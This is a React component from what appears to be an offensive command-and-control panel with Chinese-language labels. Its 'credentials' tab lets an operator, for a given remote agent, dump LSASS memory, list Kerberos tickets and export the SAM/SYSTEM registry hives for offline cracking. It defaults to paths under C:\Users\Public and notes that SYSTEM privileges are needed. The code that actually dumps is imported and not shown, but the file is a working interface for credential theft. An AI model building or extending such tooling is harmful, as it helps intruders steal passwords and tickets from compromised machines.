import { useState, type ReactNode } from 'react';
import { Button, Chip, Input, Label, TextField } from '@heroui/react';
import { dumpLsass, klist, saveSam, type KlistTicket } from '../../api/othersoft';

function Action({ loading, onClick, children, variant = 'ghost' }: {
  loading: boolean;
  onClick: () => void;
  children: ReactNode;
  variant?: 'ghost' | 'primary';
}) {
  return (
    <Button size="sm" variant={variant} isDisabled={loading} onPress={onClick}>
      {loading ? '…' : children}
    </Button>
  );
}

export function CredsTab({ agentId }: { agentId: string }) {
  const [dumpPath, setDumpPath] = useState('C:\\Users\\Public\\lsass.dmp');
  const [samDir, setSamDir] = useState('C:\\Users\\Public');
  const [tickets, setTickets] = useState<KlistTicket[]>([]);
  const [message, setMessage] = useState('');
  const [busy, setBusy] = useState<string | null>(null);

  const run = async (key: string, fn: () => Promise<unknown>) => {
    setBusy(key);
    setMessage('');
    try {
      const r = await fn() as { success?: boolean; error?: string; path?: string };
      setMessage(r?.error ?? (r?.success ? 'OK' : 'failed'));
      return r;
    } catch (e) {
      setMessage(String(e));
      return null;
    } finally {
      setBusy(null);
    }
  };

  const doLsass = () => run('lsass', async () => {
    const r = await dumpLsass(agentId, dumpPath);
    if (r?.success && r.path) setMessage(`已转储到 ${r.path}`);
    return r;
  });

  const doKlist = () => run('klist', async () => {
    const r = await klist(agentId);
    if (r?.success) setTickets(r.tickets ?? []);
    return r;
  });

  const doSam = () => run('sam', async () => {
    const r = await saveSam(agentId, samDir);
    if (r?.success) setMessage(`已导出到 ${samDir}`);
    return r;
  });

  return (
    <div className="space-y-4">
      <div className="space-y-2">
        <div className="text-sm text-neutral-400">LSASS 转储（需 SYSTEM/SeDebugPrivilege）</div>
        <div className="flex flex-wrap items-center gap-2">
          <TextField variant="secondary" value={dumpPath} onChange={setDumpPath} className="w-72">
            <Label>转储路径</Label>
            <Input />
          </TextField>
          <Action loading={busy === 'lsass'} onClick={doLsass} variant="primary">转储 LSASS</Action>
        </div>
      </div>

      <div className="space-y-2">
        <div className="flex items-center gap-2">
          <div className="text-sm text-neutral-400">Kerberos 票据（klist）</div>
          <Action loading={busy === 'klist'} onClick={doKlist}>查询票据</Action>
        </div>
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neutral-800 text-neutral-400">
              <th className="text-left py-1.5 px-2">SPN</th>
              <th className="text-left py-1.5 px-2">域</th>
              <th className="text-left py-1.5 px-2">过期</th>
              <th className="text-left py-1.5 px-2">加密</th>
            </tr>
          </thead>
          <tbody>
            {tickets.length === 0 ? (
              <tr>
                <td colSpan={4} className="text-center text-neutral-500 py-6">暂无票据</td>
              </tr>
            ) : tickets.map((t, i) => (
              <tr key={i} className="border-b border-neutral-900">
                <td className="py-1.5 px-2">{t.server || '-'}</td>
                <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{t.realm || '-'}</Chip></td>
                <td className="py-1.5 px-2">{t.end ? new Date(t.end / 10000 - 11644473600000).toLocaleString() : '-'}</td>
                <td className="py-1.5 px-2">{String(t.encryption)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="space-y-2">
        <div className="text-sm text-neutral-400">SAM/SYSTEM 导出（需 SYSTEM，供离线解密）</div>
        <div className="flex flex-wrap items-center gap-2">
          <TextField variant="secondary" value={samDir} onChange={setSamDir} className="w-64">
            <Label>导出目录</Label>
            <Input />
          </TextField>
          <Action loading={busy === 'sam'} onClick={doSam}>导出 SAM</Action>
        </div>
      </div>

      {message && <div className="text-sm text-neutral-500">{message}</div>}
    </div>
  );
}
